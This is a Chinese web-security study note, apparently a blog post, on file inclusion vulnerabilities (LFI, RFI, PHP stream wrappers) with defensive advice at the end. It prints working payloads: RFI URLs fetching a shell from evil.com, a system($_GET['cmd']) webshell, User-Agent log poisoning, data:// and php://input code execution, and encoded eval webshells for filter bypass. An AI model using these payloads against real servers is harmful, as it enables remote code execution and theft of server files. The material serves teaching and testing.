#  第69天-Web攻防学习笔记：文件包含漏洞（LFI / RFI / 伪协议 / 无文件利用）  
原创 萧瑶
                    萧瑶  AlphaNet   2026-03-06 10:59  
  
# 在 Web 应用开发中，“代码复用”是一种非常常见的开发模式。开发者通常会将一些通用函数或页面逻辑拆分到独立文件中，通过 include / require 等方式在需要时调用。这种机制虽然提高了开发效率，但如果 包含文件路径可被用户控制，就可能产生一种经典的 Web 安全漏洞——文件包含漏洞（File Inclusion）。  
  
  
这种漏洞不仅能够读取服务器敏感文件，在某些条件下甚至可以进一步实现 **远程代码执行（RCE）**。在渗透测试、漏洞赏金以及 CTF 竞赛中，文件包含漏洞一直是一个非常核心的攻击面。  
  
  
下面系统梳理文件包含漏洞的原理、分类、审计方法以及常见利用技术。  
  
  
# 一、文件包含漏洞原理  
  
  
文件包含（File Inclusion）本质上是一种 **动态加载代码或文件内容的机制**。  
  
  
在 PHP、Java、ASP.NET 等语言中，程序可以通过函数读取并执行指定文件。例如：  
  
```
<?php
include($_GET['file']);
?>

```  
  
  
如果开发者未对 file 参数进行严格限制，攻击者就可以通过构造输入控制包含文件，从而触发漏洞。  
  
  
因此文件包含漏洞的本质可以总结为：  
  
  
**用户可控输入 → 参与文件路径 → 被服务器加载执行**  
  
  
当攻击者能够控制这个路径时，就可能实现：  
  
- 敏感文件读取  
- 代码执行  
- WebShell 写入  
- 权限提升  
- 服务器信息泄露  
# 二、文件包含漏洞分类  
  
  
文件包含漏洞通常分为两种类型：  
  
## 1、本地文件包含（LFI）  
  
  
Local File Include，攻击者只能包含服务器本地存在的文件。  
  
  
例如：  
  
```
http://example.com/index.php?file=/etc/passwd

```  
  
  
服务器可能读取系统文件：  
  
```
/etc/passwd

```  
  
  
LFI常见用途：  
  
- 读取系统配置文件  
- 读取网站源码  
- 读取日志文件  
- 配合其他漏洞实现代码执行  
## 2、远程文件包含（RFI）  
  
  
Remote File Include，攻击者可以包含 **远程服务器上的文件**。  
  
  
例如：  
  
```
http://example.com/index.php?file=http://evil.com/shell.txt

```  
  
  
如果服务器开启 allow_url_include，则远程文件中的代码会被执行。  
  
  
远程文件内容：  
  
```
<?php system($_GET['cmd']); ?>

```  
  
  
访问：  
  
```
http://example.com/index.php?file=http://evil.com/shell.txt&cmd=id

```  
  
  
即可直接执行命令。  
  
  
## 3、LFI 与 RFI 的差异  
  
  
漏洞能否远程利用主要取决于 **服务器环境配置**：  
  
  
关键配置：  
  
```
allow_url_fopen
allow_url_include

```  
  
- **关闭**：只能 LFI  
- **开启**：可能触发 RFI  
# 三、文件包含漏洞审计（白盒）  
  
  
在源码审计过程中，可以通过 **函数搜索 + 代码追踪** 快速定位漏洞。  
  
## 1、PHP 审计重点函数  
  
  
文件包含相关函数：  
  
```
include
include_once
require
require_once

```  
  
  
两者区别：  
  
  
include  
  
- 出错时只产生 **Warning**  
- 程序继续执行  
require  
  
- 出错时 **Fatal Error**  
- 程序终止  
## 2、Java 审计关键点  
  
  
Java Web 项目中，文件读取常见类：  
  
```
java.io.File
java.io.FileReader
java.io.BufferedReader

```  
  
  
如果路径来自用户输入，也可能导致文件读取漏洞。  
  
  
## 3、ASP.NET 审计关键点  
  
  
常见文件读取类：  
  
```
System.IO.FileStream
System.IO.StreamReader

```  
  
  
如果读取路径未过滤，同样可能产生漏洞。  
  
  
## 4、白盒审计技巧  
  
  
常见审计方法包括：  
  
### 功能追踪  
  
  
从功能入口分析调用链：  
  
```
用户参数 → 控制器 → 文件读取函数

```  
  
### 函数搜索  
  
  
直接搜索危险函数：  
  
```
include(
require(
FileReader(
FileStream(

```  
  
### 伪协议分析  
  
  
检查是否存在绕过逻辑，例如：  
  
```
php://
data://
file://

```  
  
  
# 四、文件包含漏洞黑盒发现  
  
  
黑盒测试主要通过 **参数特征识别** 来发现漏洞。  
  
  
常见可疑参数：  
  
```
file
path
dir
page
archive
template
language
include

```  
  
  
例如：  
  
```
index.php?page=home.php

```  
  
  
测试 payload：  
  
```
?page=../../../../etc/passwd

```  
  
  
如果返回系统信息，则可能存在漏洞。  
  
  
# 五、本地文件包含利用思路  
  
  
LFI 本身往往只能读取文件，但如果结合其他技术，可以实现 **代码执行**。  
  
  
常见利用方式包括：  
  
### 1、配合文件上传  
  
  
攻击者先上传 WebShell：  
  
```
upload/shell.php

```  
  
  
然后利用 LFI：  
  
```
?page=upload/shell.php

```  
  
  
执行恶意代码。  
  
  
### 2、日志文件包含  
  
  
Web服务器会记录访问日志，例如：  
  
```
/var/log/nginx/access.log

```  
  
  
攻击者将恶意代码写入 UA：  
  
```
User-Agent: <?php system($_GET['cmd']); ?>

```  
  
  
然后包含日志文件：  
  
```
?page=/var/log/nginx/access.log

```  
  
  
实现代码执行。  
  
  
### 3、SESSION 文件包含  
  
  
PHP session 默认存储路径：  
  
```
/tmp/sess_xxxxxx

```  
  
  
如果攻击者可以控制 session 内容，就可能写入代码。  
  
  
再通过 LFI 包含：  
  
```
?page=/tmp/sess_xxxxx

```  
  
  
触发执行。  
  
  
### 4、PHP 伪协议利用  
  
  
PHP 提供了多种 **Stream Wrapper（流包装器）**，可以绕过部分过滤。  
  
  
常见协议：  
  
```
php://
data://
file://
zlib://

```  
  
  
# 六、常见伪协议利用  
  
## 1、读取文件  
  
```
file:///etc/passwd

```  
  
  
Base64读取源码：  
  
```
php://filter/read=convert.base64-encode/resource=index.php

```  
  
  
返回结果为 Base64，可解码得到源码。  
  
  
## 2、写入文件  
  
  
通过 filter 写入：  
  
```
php://filter/write=convert.base64-decode/resource=shell.php

```  
  
  
配合 POST 数据写入代码。  
  
  
## 3、代码执行  
  
  
利用 php://input  
  
```
?file=php://input

```  
  
  
POST：  
  
```
<?php phpinfo(); ?>

```  
  
  
## 4、data 协议  
  
  
直接执行代码：  
  
```
data://text/plain,<?php phpinfo();?>

```  
  
  
Base64方式：  
  
```
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+

```  
  
  
# 七、CTF 常见利用方式  
  
  
在 CTF 中，文件包含漏洞经常结合伪协议考察。  
  
## 1、php://filter 读取源码  
  
```
?file=php://filter/read=convert.base64-encode/resource=flag.php

```  
  
  
## 2、php://input 执行命令  
  
```
?file=php://input

```  
  
  
POST：  
  
```
<?php system('tac flag.php');?>

```  
  
  
## 3、data 协议执行代码  
  
```
?file=data://text/plain,<?=system('tac flag.*');?>

```  
  
  
## 4、远程文件包含  
  
```
?file=http://evil.com/1.txt

```  
  
  
远程文件：  
  
```
<?php system('tac flag.php'); ?>

```  
  
  
# 八、高级绕过技巧  
  
  
在实际环境中，开发者可能会过滤关键字：  
  
```
php
<?
?>

```  
  
  
此时可以使用编码绕过。  
  
  
## 1、Base64 写入  
  
```
php://filter/write=convert.base64-decode/resource=shell.php

```  
  
  
POST：  
  
```
PD9waHAgZXZhbCgkX1BPU1RbYV0pOz8+

```  
  
  
## 2、ROT13 编码  
  
```
php://filter/write=string.rot13/resource=shell.php

```  
  
  
代码：  
  
```
<?cuc riny($_CBFG[1]);?>

```  
  
  
ROT13解码后为 PHP 代码。  
  
  
## 3、ICONV 编码  
  
  
利用字符编码转换：  
  
```
php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php

```  
  
  
可以绕过部分 WAF。  
  
  
# 九、实战案例  
  
  
真实漏洞案例：  
  
```
http://testphp.vulnweb.com/showimage.php?file=index.php

```  
  
  
利用 payload：  
  
```
?file=php://filter/read=convert.base64-encode/resource=index.php

```  
  
  
即可读取源码。  
  
  
这类漏洞在 **SRC漏洞赏金平台** 中非常常见。  
  
  
# 十、安全防御建议  
  
  
针对文件包含漏洞，应采取以下措施：  
  
### 1、固定文件路径  
  
  
使用白名单：  
  
```
$pages = ['home','about','contact'];

if(in_array($_GET['page'],$pages)){
    include($_GET['page'].".php");
}

```  
  
  
### 2、关闭危险配置  
  
```
allow_url_include = Off
allow_url_fopen = Off

```  
  
  
### 3、严格过滤输入  
  
  
禁止出现：  
  
```
../
php://
data://
http://

```  
  
  
### 4、最小权限原则  
  
  
限制 Web 服务器访问系统敏感目录。  
  
  
# 总结  
  
  
文件包含漏洞是 Web 安全中 **经典且极具利用价值的漏洞类型**。  
  
  
攻击链通常如下：  
  
```
用户输入 → 文件路径控制 → 文件读取 → 代码执行

```  
  
  
结合不同技术，可以实现多种攻击方式：  
  
- LFI 本地文件读取  
- RFI 远程代码执行  
- 伪协议利用  
- 日志包含  
- SESSION 包含  
- 无文件 WebShell  
在渗透测试、漏洞赏金、CTF比赛中，掌握文件包含漏洞不仅可以快速突破 Web 入口，还常常成为 **服务器控制权限的关键一步**。  
  
  
理解其原理、利用方式以及绕过技巧，是每一个 Web 安全研究者必须掌握的核心技能之一。  
  
  
